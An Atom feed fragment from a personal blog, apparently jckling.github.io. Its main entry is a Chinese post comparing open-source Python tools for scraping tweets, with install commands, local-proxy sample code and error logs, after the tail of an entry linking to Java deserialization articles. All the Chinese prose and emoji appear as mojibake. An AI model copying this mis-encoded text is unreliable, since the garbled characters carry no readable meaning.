href="http://galaxylab.pingan.com.cn/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E8%BE%85%E5%8A%A9%E5%B7%A5%E5%85%B7%E4%B9%8B-gadgetinspector/">Javaååºåˆ—åŒ–æ¼æ´è¾…åŠ©å·¥å…·ä¹‹ gadgetinspector</a></li><li><a href="https://threedr3am.github.io/2020/01/09/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E9%93%BE%E8%87%AA%E5%8A%A8%E6%8C%96%E6%8E%98%E5%B7%A5%E5%85%B7gadgetinspector%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/">javaååºåˆ—åŒ–åˆ©ç”¨é“¾è‡ªåŠ¨æŒ–æ˜å·¥å…·gadgetinspectoræºç æµ…æ</a></li></ul>]]></content>
    
    
    <summary type="html">æ„Ÿè§‰è‡ªå·±çœ‹äº†å¥½ä¹…å¥½ä¹…... é•¿æ–‡è­¦å‘Šâš ï¸</summary>
    
    
    
    <category term="Security" scheme="https://jckling.github.io/categories/Security/"/>
    
    
    <category term="Java" scheme="https://jckling.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Python çˆ¬å– twitter æ•°æ®</title>
    <link href="https://jckling.github.io/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/"/>
    <id>https://jckling.github.io/2021/10/11/Other/Python%20%E7%88%AC%E5%8F%96%20twitter%20%E6%95%B0%E6%8D%AE/</id>
    <published>2021-10-11T10:44:50.000Z</published>
    <updated>2021-12-20T13:43:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æ¥åˆ°ä¸€ä¸ªéœ€æ±‚ï¼šçˆ¬åŒ…å«å…³é”®å­—çš„æ¨æ–‡ã€‚åæ¥æ‰å‘Šè¯‰æˆ‘è½¬äº¤ç»™åˆ«äººåšäº†ï¼ˆæ‘Šæ‰‹ï¼‰ï¼Œé‚£è¿™é‡Œå°±åˆ†äº«ä¸€ä¸‹å¦‚ä½•çˆ¬å– twitter æ•°æ®ã€‚<br><em>ç»“æœæˆ‘æ‹–äº†ä¸¤å‘¨æ‰å¼€å§‹æ¢³ç†</em> ğŸ˜‚</p><h1 id="Twitter-API"><a href="#Twitter-API" class="headerlink" title="Twitter API"></a>Twitter API</h1><p>æ¨ç‰¹æä¾›äº† Twitter APIï¼Œå¯ä»¥ç”¨äºæŸ¥è¯¢æ¨ç‰¹æ•°æ®ï¼Œä¸ªäººä½¿ç”¨çš„è¯æœ‰ä»¥ä¸‹ä¸¤ç§ï¼š</p><ol><li>Twitter API v2</li><li>Standard v1.1</li></ol><p>å½“ç„¶è¿˜æœ‰é«˜çº§ç‰ˆå’Œä¼ä¸šç‰ˆï¼š</p><ol><li>Premium v1.1</li><li>Enterprise</li></ol><p>æ ‡å‡†ç‰ˆä»…æ”¯æŒæœç´¢ 7 å¤©å†…çš„æ¨ç‰¹ï¼Œå…¶ä½™éƒ½æ”¯æŒå…¨æœç´¢ï¼ˆä» 2006.03 å¼€å§‹ï¼‰ï¼Œå®˜æ–¹ç»™å‡ºäº†æ¯”è¾ƒï¼š<a href="https://developer.twitter.com/en/docs/twitter-api/tweets/search/migrate">Comparing Twitter APIâ€™s Search Tweets endpoints</a> ã€‚</p><p>ä½¿ç”¨æ ‡å‡†ç‰ˆéœ€è¦ç”³è¯·å¼€å‘è€…è´¦æˆ·<a href="https://developer.twitter.com/en/apply/user.html">Apply for a developer account</a>ï¼Œä½¿ç”¨ v2 ç‰ˆæœ¬çš„éœ€è¦ç”³è¯· <a href="https://developer.twitter.com/en/products/twitter-api/academic-research">Academic Research product track</a>ã€‚æˆ‘è¯•äº†ç”³è¯·å¼€å‘è€…è´¦æˆ·ï¼Œç„¶åå¦¥å¦¥åœ°è¢«æ‹’ç»äº†ï¼Œæœ‰äººè¯´éœ€è¦ç¾å›½è´¦æˆ·/æ‰‹æœºå·ä¹‹ç±»çš„ä¿¡æ¯ï¼Œå› ä¸ºä¸æƒ³æ‹¿è‡ªç”¨çš„æ¨ç‰¹çæµ‹è¯•ï¼Œä¹Ÿå°±ç½¢äº†ã€‚</p><img src="https://i.loli.net/2021/10/11/YouCXye5JHLgNDZ.png" width="85%"><p>è¿™é‡Œçš„ç›®æ ‡æ˜¯æœç´¢ç‰¹å®šæ—¶é—´èŒƒå›´å†…ï¼ŒåŒ…å«ç‰¹å®šå…³é”®è¯çš„ tweetsï¼ˆå³ï¼Œæ¨æ–‡ï¼‰ï¼Œå› æ­¤å°±ç®—ç”³è¯·åˆ°äº†ä¹Ÿä¸èƒ½æ»¡è¶³éœ€æ±‚ï¼Œè½¬è€Œå¯»æ±‚å¼€æºè§£å†³æ–¹æ¡ˆã€‚</p><h1 id="å¼€æºè§£å†³æ–¹æ¡ˆ"><a href="#å¼€æºè§£å†³æ–¹æ¡ˆ" class="headerlink" title="å¼€æºè§£å†³æ–¹æ¡ˆ"></a>å¼€æºè§£å†³æ–¹æ¡ˆ</h1><p>æœç´¢ GitHub ä¸Šçˆ¬å– twitter æ•°æ®çš„å¼€æºé¡¹ç›®ï¼Œç­›é€‰å‡ºä»¥ä¸‹ 9 ä¸ªè¯•ç”¨ï¼ˆæŒ‰ star æ•°é‡æ’åˆ—ï¼‰ï¼š</p><table><thead><tr><th>åç§°</th><th>star</th><th>æœ€åä¸€æ¬¡æ›´æ–°</th><th>æ˜¯å¦å¯ç”¨</th></tr></thead><tbody><tr><td><a href="https://github.com/twintproject/twint">twint</a></td><td>12.1k</td><td>2021.03.03</td><td>âŒ</td></tr><tr><td><a href="https://github.com/tweepy/tweepy">tweepy</a></td><td>8.3k</td><td>2021.11.23</td><td>âœ”ï¸ï¼ˆéœ€è¦ç”³è¯· Twitter APIï¼‰</td></tr><tr><td><a href="https://github.com/bisguzar/twitter-scraper">twitter-scraper</a></td><td>3k</td><td>2021.12.18</td><td>âŒ</td></tr><tr><td><a href="https://github.com/taspinar/twitterscraper">twitterscraper</a></td><td>2k</td><td>2020.07.28</td><td>âŒ</td></tr><tr><td><a href="https://github.com/Altimis/Scweet">Scweet</a></td><td>266</td><td>2021.11.08</td><td>âœ”ï¸</td></tr><tr><td><a href="https://github.com/Solin1998/SearchTT">SearchTT</a></td><td>133</td><td>2020.06.04</td><td>âŒ</td></tr><tr><td><a href="https://github.com/amitupreti/Hands-on-WebScraping/tree/master/project1_twitter_hashtag_crawler">Twitter Hashtag crawler</a></td><td>71</td><td>2020.12.16</td><td>âŒ</td></tr><tr><td><a href="https://github.com/markowanga/stweet">stweet</a></td><td>69</td><td>2021.10.14</td><td>âœ”ï¸</td></tr><tr><td><a href="https://github.com/wyfok/Web_Scraping_Tweet_Traffic">Web_Scraping_Tweet_Traffic</a></td><td>6</td><td>2019.12.15</td><td>âŒ</td></tr></tbody></table><h2 id="twint"><a href="#twint" class="headerlink" title="twint"></a><a href="https://github.com/twintproject/twint">twint</a></h2><p>ä¸ç”¨ Twitter API çˆ¬å–æ¨æ–‡ï¼Œæ”¯æŒæ ‡ç­¾ã€è¶‹åŠ¿ã€æ•æ„Ÿä¿¡æ¯ç­‰æœç´¢é€‰é¡¹ï¼Œä¹Ÿæ”¯æŒçˆ¬å–ç”¨æˆ·ä¿¡æ¯ï¼ŒåŒ…æ‹¬å…³æ³¨è€…ã€æ¨æ–‡ã€‚</p><ol><li><p>å®‰è£…</p><p> ç›´æ¥ä» pypi å®‰è£…çš„åŒ…ç‰ˆæœ¬è¾ƒä½ï¼Œéœ€è¦å‡çº§</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --upgrade git+https://github.com/twintproject/twint.git@origin/master<span class="comment">#egg=twint</span></span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> é…ç½®ä¸€ä¸ªä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> twint</span><br><span class="line"></span><br><span class="line">c = twint.Config()</span><br><span class="line">c.Proxy_host = <span class="string">&#x27;127.0.0.1&#x27;</span></span><br><span class="line">c.Proxy_port = <span class="string">&#x27;7890&#x27;</span></span><br><span class="line">c.Proxy_type = <span class="string">&#x27;http&#x27;</span></span><br><span class="line"></span><br><span class="line">c.Store_csv = <span class="literal">True</span></span><br><span class="line">c.Output = <span class="string">&quot;tweets.csv&quot;</span></span><br><span class="line"></span><br><span class="line">c.Limit = <span class="number">10</span></span><br><span class="line">c.Custom_query = <span class="string">&quot;nijisanji&quot;</span></span><br><span class="line"></span><br><span class="line">twint.run.Search(c)</span><br></pre></td></tr></table></figure><p> ç„¶åæŒ‚æ‰</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING:root:Error retrieving https://twitter.com/: ConnectTimeout(MaxRetryError(<span class="string">&quot;HTTPSConnectionPool(host=&#x27;twitter.com&#x27;, port=443): Max retries exceeded with url: / (Caused by ConnectTimeoutError(&lt;urllib3.connection.HTTPSConnection object at 0x000001D2C5A295B0&gt;, &#x27;Connection to twitter.com timed out. (connect timeout=10)&#x27;))&quot;</span>)), retrying</span><br></pre></td></tr></table></figure><p> ç¿»äº†ç¿» issue æœ‰äººåœ¨äºŒæœˆä»½ä¿®å¤äº†ï¼š<a href="https://github.com/twintproject/twint/pull/1138">Fix the bug that proxy cannot be used when get token #1138</a>ï¼Œä½†æ²¡æœ‰åˆå¹¶ã€‚</p><p> é¡ºä¾¿å‘ç°æœ‰äººæè®¾ç½®æ—¶é—´èŒƒå›´çš„ <code>since</code> å’Œ <code>until</code> å¤±æ•ˆäº†</p><ul><li><a href="https://github.com/twintproject/twint/issues/1281">c.Since and c.Until not getting all tweets #1281</a></li><li><a href="https://github.com/twintproject/twint/issues/1261">Since~Until doesnâ€™t work anymore #1261</a></li></ul></li><li><p>æ€»ç»“</p><p> è‡ªå·±è¯•ç€ä¿®æ”¹æˆ–è€…ç­‰ä¸€ä¸ªå¤§æ›´æ–°ï¼Œå››ç™¾å¤šçš„ issue çœ‹æ¥æ˜¯æ²¡æœ‰å¤ªå¤šçš„ç²¾åŠ›ä¿®å•ŠğŸ˜…</p></li></ol><h2 id="tweepy"><a href="#tweepy" class="headerlink" title="tweepy"></a><a href="https://github.com/tweepy/tweepy">tweepy</a></h2><p>å®é™…ä¸Šå°±æ˜¯å¯¹ twitter API çš„å°è£…ï¼Œä¸ç”¨ä»é›¶æ‰‹å†™è¯·æ±‚å’Œå¤„ç†æ•°æ®ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tweepy</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> æ²¡æœ‰ç”³è¯·åˆ°å¼€å‘è€…è´¦æˆ·ï¼Œè·³è¿‡ï¼</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> tweepy</span><br><span class="line"></span><br><span class="line">auth = tweepy.OAuthHandler(consumer_key, consumer_secret)</span><br><span class="line">auth.set_access_token(access_token, access_token_secret)</span><br><span class="line"></span><br><span class="line">api = tweepy.API(auth)</span><br><span class="line"></span><br><span class="line">public_tweets = api.home_timeline()</span><br><span class="line"><span class="keyword">for</span> tweet <span class="keyword">in</span> public_tweets:</span><br><span class="line">    print(tweet.text)</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“</p><p> Twitter API v2 çš„æ”¯æŒè¿˜åœ¨å¼€å‘ä¸­ï¼Œç”³è¯·åˆ°å¼€å‘è€…è´¦æˆ·çš„å°±ç”¨å®ƒå§ï¼</p></li></ol><h2 id="twitter-scraper"><a href="#twitter-scraper" class="headerlink" title="twitter-scraper"></a><a href="https://github.com/bisguzar/twitter-scraper">twitter-scraper</a></h2><p>æ”¯æŒæ ‡ç­¾ã€è¶‹åŠ¿ç­‰æœç´¢é€‰é¡¹ï¼Œä¹Ÿæ”¯æŒç”¨æˆ·ä¿¡æ¯çš„æœç´¢ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install twitter_scraper</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> å› ä¸ºæ²¡æœ‰æä¾›è®¾å€¼ä»£ç†çš„é€‰é¡¹ï¼Œæ‰€ä»¥ç›´æ¥åœ¨æœ¬åœ°å¼€å…¨å±€æ¨¡å¼ä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> twitter_scraper <span class="keyword">import</span> get_tweets</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> tweet <span class="keyword">in</span> get_tweets(<span class="string">&#x27;twitter&#x27;</span>):</span><br><span class="line">    print(tweet[<span class="string">&#x27;text&#x27;</span>])</span><br></pre></td></tr></table></figure><p> æŠ¥é”™ğŸ˜…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ProxyError: HTTPSConnectionPool(host=<span class="string">&#x27;twitter.com&#x27;</span>, port=443): Max retries exceeded with url: /i/profiles/show/twitter/timeline/tweets?include_available_features=1&amp;include_entities=1&amp;include_new_items_bar=<span class="literal">true</span> (Caused by ProxyError(<span class="string">&#x27;Cannot connect to proxy.&#x27;</span>, OSError(0, <span class="string">&#x27;Error&#x27;</span>)))</span><br></pre></td></tr></table></figure><p> æ”¹ä¸‹æºç ï¼ŒæŠ¥é”™åœ¨ tweets.py è¿™ä¸ªæ–‡ä»¶ï¼Œæ·»åŠ ä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_tweets</span>(<span class="params">query, pages=<span class="number">25</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gen_tweets</span>(<span class="params">pages</span>):</span></span><br><span class="line">        proxy = <span class="string">&#x27;http://127.0.0.1:7890&#x27;</span></span><br><span class="line">        r = session.get(url, headers=headers, proxies=&#123;<span class="string">&#x27;http&#x27;</span>: proxy, <span class="string">&#x27;https&#x27;</span>: proxy&#125;)</span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p> é‡æ–°æ‰§è¡Œï¼Œæ–°çš„æŠ¥é”™ğŸ˜…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">json.decoder.JSONDecodeError: Expecting value: line 1 column 1 (char 0)</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“</p><p> ä½œè€…è¯´ç°åœ¨å·²ç»æ— æ³•ä½¿ç”¨äº†ï¼ˆ<a href="https://github.com/bisguzar/twitter-scraper/issues/191">Does this work? #191</a>ï¼‰ï¼Œè€Œä¸”è‡ªå·±å¿™äºå·¥ä½œæš‚æ—¶æ²¡æ—¶é—´æ›´æ–°ï¼ˆ<a href="https://github.com/bisguzar/twitter-scraper/issues/189#issuecomment-832690515">Doesnâ€™t scrap anything. #189</a>ï¼‰ï¼Œæš‚ä¸”è§‚æœ›å§ã€‚</p></li></ol><h2 id="twitterscraper"><a href="#twitterscraper" class="headerlink" title="twitterscraper"></a><a href="https://github.com/taspinar/twitterscraper">twitterscraper</a></h2><p>æ‰€ä»¥ä¸ºä»€ä¹ˆè¦èµ·ä¸€æ ·çš„åå­—ï¼Ÿï¼</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install twitterscraper</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> ç›´æ¥ä¸Šå‘½ä»¤è¡Œäº†ï¼Œä½†æ˜¯æ— æ³•è®¿é—®é»˜è®¤ä»£ç† <a href="https://free-proxy-list.net/">https://free-proxy-list.net</a></p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">twitterscraper Trump --<span class="built_in">limit</span> 1000 --output=tweets.json</span><br></pre></td></tr></table></figure><p> æŠ¥é”™</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.exceptions.ConnectionError: HTTPSConnectionPool(host=<span class="string">&#x27;free-proxy-list.net&#x27;</span>, port=443): Max retries exceeded with url: / (Caused by NewConnectionError(<span class="string">&#x27;&lt;urllib3.connection.HTTPSConnection object at 0x0000019FAE33BDC0&gt;: Failed to establish a new connection: [WinError 10060] ç”±äºè¿æ¥æ–¹åœ¨ä¸€æ®µæ—¶é—´åæ²¡æœ‰æ­£ç¡®ç­”å¤æˆ–è¿æ¥çš„ä¸»æœºæ²¡æœ‰ååº”ï¼Œè¿æ¥å°è¯•å¤±è´¥ã€‚&#x27;</span>))</span><br></pre></td></tr></table></figure><p> ä¿®æ”¹æºç  query.pyï¼Œç›´æ¥è¿”å›æœ¬åœ°ä»£ç†</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_proxies</span>():</span></span><br><span class="line">    <span class="keyword">return</span> [<span class="string">&#x27;127.0.0.1:7890&#x27;</span>]</span><br><span class="line">    response = requests.get(PROXY_URL)</span><br><span class="line">    soup = BeautifulSoup(response.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">    table = soup.find(<span class="string">&#x27;table&#x27;</span>,<span class="built_in">id</span>=<span class="string">&#x27;proxylisttable&#x27;</span>)</span><br><span class="line">    list_tr = table.find_all(<span class="string">&#x27;tr&#x27;</span>)</span><br><span class="line">    list_td = [elem.find_all(<span class="string">&#x27;td&#x27;</span>) <span class="keyword">for</span> elem <span class="keyword">in</span> list_tr]</span><br><span class="line">    list_td = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="literal">None</span>, list_td))</span><br><span class="line">    list_ip = [elem[<span class="number">0</span>].text <span class="keyword">for</span> elem <span class="keyword">in</span> list_td]</span><br><span class="line">    list_ports = [elem[<span class="number">1</span>].text <span class="keyword">for</span> elem <span class="keyword">in</span> list_td]</span><br><span class="line">    list_proxies = [<span class="string">&#x27;:&#x27;</span>.join(elem) <span class="keyword">for</span> elem <span class="keyword">in</span> <span class="built_in">list</span>(<span class="built_in">zip</span>(list_ip, list_ports))]</span><br><span class="line">    <span class="keyword">return</span> list_proxies               </span><br></pre></td></tr></table></figure><p> è¾“å‡ºè¯·æ±‚å‚æ•°ï¼Œç„¶åæŠ¥é”™â€¦</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">INFO:twitterscraper:queries: [<span class="string">&#x27;Trump since:2006-03-21 until:2006-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2006-12-30 until:2007-10-10&#x27;</span>, <span class="string">&#x27;Trump since:2007-10-10 until:2008-07-20&#x27;</span>, <span class="string">&#x27;Trump since:2008-07-20 until:2009-04-30&#x27;</span>, <span class="string">&#x27;Trump since:2009-04-30 until:2010-02-08&#x27;</span>, <span class="string">&#x27;Trump since:2010-02-08 until:2010-11-19&#x27;</span>, <span class="string">&#x27;Trump since:2010-11-19 until:2011-08-31&#x27;</span>, <span class="string">&#x27;Trump since:2011-08-31 until:2012-06-10&#x27;</span>, <span class="string">&#x27;Trump since:2012-06-10 until:2013-03-21&#x27;</span>, <span class="string">&#x27;Trump since:2013-03-21 until:2013-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2013-12-30 until:2014-10-10&#x27;</span>, <span class="string">&#x27;Trump since:2014-10-10 until:2015-07-21&#x27;</span>, <span class="string">&#x27;Trump since:2015-07-21 until:2016-04-30&#x27;</span>, <span class="string">&#x27;Trump since:2016-04-30 until:2017-02-09&#x27;</span>, <span class="string">&#x27;Trump since:2017-02-09 until:2017-11-20&#x27;</span>, <span class="string">&#x27;Trump since:2017-11-20 until:2018-08-31&#x27;</span>, <span class="string">&#x27;Trump since:2018-08-31 until:2019-06-11&#x27;</span>, <span class="string">&#x27;Trump since:2019-06-11 until:2020-03-21&#x27;</span>, <span class="string">&#x27;Trump since:2020-03-21 until:2020-12-30&#x27;</span>, <span class="string">&#x27;Trump since:2020-12-30 until:2021-10-11&#x27;</span>]</span><br><span class="line">ConnectionError HTTPSConnectionPool(host=<span class="string">&#x27;twitter.com&#x27;</span>, port=443): Max retries exceeded with url: /search?f=tweets&amp;vertical=default&amp;q=Trump%20since%3A2006-03-21%20until%3A2006-12-30&amp;l=None (Caused by NewConnectionError(<span class="string">&#x27;&lt;urllib3.connection.HTTPSConnection object at 0x000002975B91D430&gt;: Failed to establish a new connection: [WinError 10060] ç”±äºè¿æ¥æ–¹åœ¨ä¸€æ®µæ—¶é—´</span></span><br><span class="line"><span class="string">åæ²¡æœ‰æ­£ç¡®ç­”å¤æˆ–è¿æ¥çš„ä¸»æœºæ²¡æœ‰ååº”ï¼Œè¿æ¥å°è¯•å¤±è´¥ã€‚&#x27;</span>)) <span class="keyword">while</span> requesting <span class="string">&quot;https://twitter.com/search?f=tweets&amp;vertical=defa</span></span><br><span class="line"><span class="string">ult&amp;q=Trump%20since%3A2006-03-21%20until%3A2006-12-30&amp;l=None&quot;</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\connection.py&quot;</span>, line 174, <span class="keyword">in</span> _new_conn</span><br><span class="line">    conn = connection.create_connection(</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\util\connection.py&quot;</span>, line 96, <span class="keyword">in</span> create_connection</span><br><span class="line">    raise err</span><br><span class="line">File <span class="string">&quot;C:\Users\linki\Desktop\t\lib\site-packages\urllib3\util\connection.py&quot;</span>, line 86, <span class="keyword">in</span> create_connection</span><br><span class="line">    sock.connect(sa)</span><br><span class="line">TimeoutError: [WinError 10060] ç”±äºè¿æ¥æ–¹åœ¨ä¸€æ®µæ—¶é—´åæ²¡æœ‰æ­£ç¡®ç­”å¤æˆ–è¿æ¥çš„ä¸»æœºæ²¡æœ‰ååº”ï¼Œè¿æ¥å°è¯•å¤±è´¥ã€‚</span><br></pre></td></tr></table></figure></li><li><p>æ€»ç»“ </p><p> ç¿»äº†ç¿» issueï¼šæ²¡æ³•ç”¨ï¼Œç­‰æ›´æ–°ã€‚</p></li></ol><h2 id="Scweet"><a href="#Scweet" class="headerlink" title="Scweet"></a><a href="https://github.com/Altimis/Scweet">Scweet</a></h2><p>æ”¯æŒå…³é”®è¯ã€æ ‡ç­¾ã€æ—¶é—´èŒƒå›´ç­‰æœç´¢é€‰é¡¹ï¼Œä¹Ÿæ”¯æŒç”¨æˆ·ä¿¡æ¯ã€å…³æ³¨ã€å…³æ³¨è€…çš„çˆ¬å–ã€‚</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Scweet==1.6</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> ç”¨ selenium æ¨¡æ‹Ÿæµè§ˆå™¨è®¿é—®ï¼Œç«Ÿç„¶è¿˜ä¸æ˜¯ headless æ¨¡å¼ï¼Œç›´æ¥ç»™æˆ‘å¼¹å‡ºä¸€ä¸ªçª—å£å¯è¿˜è¡Œã€‚æ³¨æ„è¿™é‡Œä¸æ˜¯æœ¬åœ°æ—¶é—´ï¼Œæ˜¯ UTC æ—¶é—´ï¼›å­˜å‚¨æ ¼å¼ä¸º UTF-8ã€‚</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Scweet.scweet <span class="keyword">import</span> scrape</span><br><span class="line"></span><br><span class="line">data = scrape(words=[<span class="string">&quot;nijisanji&quot;</span>], since=<span class="string">&quot;2020-01-01&quot;</span>, until=<span class="string">&quot;2021-01-01&quot;</span>, from_account=<span class="literal">None</span>,</span><br><span class="line">            interval=<span class="number">1</span>,</span><br><span class="line">            headless=<span class="literal">False</span>, display_type=<span class="string">&quot;Latest&quot;</span>, save_images=<span class="literal">False</span>, proxy=<span class="string">&quot;127.0.0.1:7890&quot;</span>, save_dir=<span class="string">&#x27;outputs&#x27;</span>,</span><br><span class="line">            resume=<span class="literal">False</span>, filter_replies=<span class="literal">True</span>, proximity=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p> ç»“æœçˆ¬äº† 175 æ¡æ•°æ®</p> <img src="https://i.loli.net/2021/10/11/iO3AjzBJUMm8th4.png"></li><li><p>æ€»ç»“</p><p> å¯ä»¥ç”¨ï¼æš‚æ—¶æ²¡é‡åˆ°ä»€ä¹ˆé—®é¢˜ï¼Œç”¨å®ƒï¼</p></li></ol><h2 id="SearchTT"><a href="#SearchTT" class="headerlink" title="SearchTT"></a><a href="https://github.com/Solin1998/SearchTT">SearchTT</a></h2><p>è¿˜å†™äº†ä¸€ç¯‡çŸ¥ä¹æ–‡ç« ï¼š<a href="https://zhuanlan.zhihu.com/p/87931509">è¿™å¯èƒ½æ˜¯æ˜¯ä¸­æ–‡ç½‘ä¸Šå…³äºTwitterä¿¡æ¯æ£€ç´¢çˆ¬è™«æœ€å…¨çš„é¡¹ç›®äº†</a></p><p>æè¿°å«ç³Šã€ä»“åº“ä¸æ›´æ–°ã€ç”šè‡³è¿˜æ›¾å‡ºç§Ÿ APIï¼ˆè¯„è®ºé‡Œçœ‹èµ·æ¥å¯èƒ½æ˜¯ï¼‰ï¼Œæ‹‰å€’ğŸ™‚ã€‚</p><h2 id="Twitter-Hashtag-crawler"><a href="#Twitter-Hashtag-crawler" class="headerlink" title="Twitter Hashtag crawler"></a><a href="https://github.com/amitupreti/Hands-on-WebScraping/tree/master/project1_twitter_hashtag_crawler">Twitter Hashtag crawler</a></h2><p>æ ¹æ®æ ‡ç­¾ï¼ˆhashtagï¼‰æœç´¢</p><ol><li><p>å®‰è£…</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/amitupreti/Hands-on-WebScraping</span><br><span class="line"><span class="built_in">cd</span> Hands-on-WebScraping/project1_twitter_hashtag_crawler</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p> æŠ¥é”™</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR: Could not find a version that satisfies the requirement dateutil (from versions: none)</span><br><span class="line">ERROR: No matching distribution found <span class="keyword">for</span> dateutil</span><br></pre></td></tr></table></figure><p> ä½†æ˜¯æœ¬åœ°å·²ç»æœ‰äº† dateutil</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pip install python-dateutil --upgrade</span><br><span class="line"><span class="comment"># Looking in indexes: https://pypi.tuna.tsinghua.edu.cn/simple</span></span><br><span class="line"><span class="comment"># Requirement already satisfied: python-dateutil in c:\users\linki\desktop\t\lib\site-packages (2.8.2)</span></span><br><span class="line"><span class="comment"># Requirement already satisfied: six&gt;=1.5 in c:\users\linki\desktop\t\lib\site-packages (from python-dateutil) (1.16.0)</span></span><br></pre></td></tr></table></figure><p> ç›´æ¥è£…ä¸ª scrapy å¾—äº†</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install scrapy</span><br><span class="line">pip install ipdb</span><br></pre></td></tr></table></figure></li><li><p>ç¤ºä¾‹</p><p> 